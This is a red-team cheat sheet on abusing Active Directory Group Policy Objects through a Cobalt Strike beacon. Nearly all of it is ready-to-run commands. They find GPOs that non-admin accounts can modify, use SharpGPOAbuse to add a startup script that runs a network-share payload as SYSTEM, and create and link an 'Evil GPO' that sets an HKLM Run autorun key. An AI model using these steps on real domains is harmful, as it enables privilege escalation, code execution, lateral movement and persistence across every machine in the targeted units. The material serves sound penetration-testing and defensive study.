## GPO Abuse

Abusing Group Policy Objects for code execution, lateral movement, and persistence. Requires write permissions on an existing GPO, or rights to create and link new ones.

> [!Important]
> By default, only Domain Admins can create and link GPOs. However, it's common practice to delegate these rights to other groups (e.g. "Workstation Admins"). These delegations are privilege escalation opportunities.

> [!Note]
> GPO startup scripts double as persistence — they survive reboots and apply to all machines in the linked OU.

---

### Finding Modifiable GPOs

Filter for GPOs where non-privileged accounts (not SYSTEM / Domain Admins / Enterprise Admins) have CreateChild or WriteProperty rights.

```sh
# CS
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-<domain_id>-[\d]{4,10}" }

# Resolve the GPO name and SYSVOL path
beacon> powershell Get-DomainGPO -Identity "CN={<ObjectDN>},CN=Policies,CN=System,DC=<domain>,DC=<tld>" | select displayName, gpcFileSysPath

# Find which OUs the GPO is linked to
beacon> powershell Get-DomainOU -GPLink "{<GPO_GUID>}" | select distinguishedName

# Find computers in the affected OU
beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=<domain>,DC=<tld>" | select dnsHostName
```

---

### Modifying an Existing GPO (SharpGPOAbuse)

SharpGPOAbuse automates common GPO abuses. The startup script approach writes to SYSVOL and executes as SYSTEM on next reboot (or `gpupdate /force` + reboot).

```sh
# CS — Add a computer startup script
beacon> execute-assembly C:\Tools\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\<dc>\share\payload.exe" --GPOName "<GPO_Name>"

# Force immediate update (requires console access or psexec to target)
gpupdate /force
# Then reboot — startup script executes as SYSTEM
```

#### Direct SYSVOL Modification

Browse and modify the GPO files directly:

```sh
beacon> ls \\<domain>\SysVol\<domain>\Policies\{<GPO_GUID>}
# Edit scripts under \Machine\Scripts\Startup\ or \User\Scripts\Logon\
```

---

### Creating a New GPO

Requires two permissions:
1. **CreateChild** on `CN=Policies,CN=System` — to create GPOs
2. **Write gPLink** on target OUs — to link the GPO

```sh
# 1. Find principals that can create GPOs
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=<domain>,DC=<tld>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

# 2. Find OUs where a principal can link GPOs
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

# 3. Check if RSAT GroupPolicy modules are available
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# 4. Create a new GPO
beacon> powershell New-GPO -Name "Evil GPO"

# 5. Add an HKLM autorun key (requires reboot to execute)
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\<dc>\share\payload.exe" -Type ExpandString

# 6. Link the GPO to a target OU
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=<domain>,DC=<tld>"
```

> [!Warning]
> HKLM autoruns require a reboot to execute. A startup script via SharpGPOAbuse is triggered the same way but also works as a persistent implant.
